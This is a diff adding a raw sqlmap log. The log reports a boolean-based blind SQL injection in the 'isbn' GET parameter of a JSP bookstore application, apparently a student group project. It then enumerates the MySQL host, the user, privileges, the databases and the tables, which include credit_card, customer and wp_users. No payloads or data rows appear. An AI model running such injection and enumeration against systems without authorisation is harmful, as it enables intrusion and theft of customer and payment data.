@@ -1,0 +1,103 @@
+
+    sqlmap/1.0-dev - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+
+[*] starting at 16:52:09
+
+how do you want to proceed? [(C)ontinue/(s)tring/(r)egex/(q)uit] C
+sqlmap identified the following injection points with a total of 757 HTTP(s) requests:
+---
+Place: GET
+Parameter: isbn
+    Type: boolean-based blind
+
+---
+web application technology: JSP, JSP 2.2
+back-end DBMS operating system: Linux Ubuntu
+back-end DBMS: active fingerprint: MySQL >= 5.5.0
+               banner parsing fingerprint: MySQL 5.5.32
+banner:    '5.5.32-0ubuntu0.12.04.1'
+current user:    'sigbjoo_group12@%'
+current database:    'sigbjoo_group12'
+hostname:    'arctos'
+database management system users [1]:
+[*] 'sigbjoo_group12'@'%'
+
+
+database management system users privileges:
+[*] %sigbjoo_group12% [1]:
+    privilege: USAGE
+
+database management system users roles:
+[*] %sigbjoo_group12% [1]:
+    role: USAGE
+
+available databases [4]:
+[*] information_schema
+[*] sigbjoo_group12
+[*] test
+[*] test_oyas
+
+Database: test
+[16 tables]
++---------------------------------------+
+| tblKontakter                          |
+| tblKontakterlocA                      |
+| tblPlan                               |
+| tblPlanlocA                           |
+| tblReirbesok                          |
+| tblReirbesoklocA                      |
+| tblReirunge                           |
+| tblReirungelocA                       |
+| tblSted                               |
+| tblStedlocA                           |
++---------------------------------------+
+
+Database: test_oyas
+[11 tables]
++---------------------------------------+
+| wp_commentmeta                        |
+| wp_comments                           |
+| wp_links                              |
+| wp_options                            |
+| wp_postmeta                           |
+| wp_posts                              |
+| wp_term_relationships                 |
+| wp_term_taxonomy                      |
+| wp_terms                              |
+| wp_usermeta                           |
+| wp_users                              |
++---------------------------------------+
+
+Database: information_schema
+[40 tables]
++---------------------------------------+
+| CHARACTER_SETS                        |
+| PARAMETERS                            |
+| SCHEMATA                              |
+| TABLES                                |
+| TABLESPACES                           |
++---------------------------------------+
+
+Database: sigbjoo_group12
+[13 tables]
++---------------------------------------+
+| order                                 |
+| address                               |
+| author                                |
+| author_x_book                         |
+| book                                  |
+| category                              |
+| category_x_title                      |
+| credit_card                           |
+| customer                              |
+| mail                                  |
+| order_items                           |
+| publisher                             |
+| title                                 |
++---------------------------------------+
+
+do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
+
+100% [========================================================================================] 1/1                                                                                                              
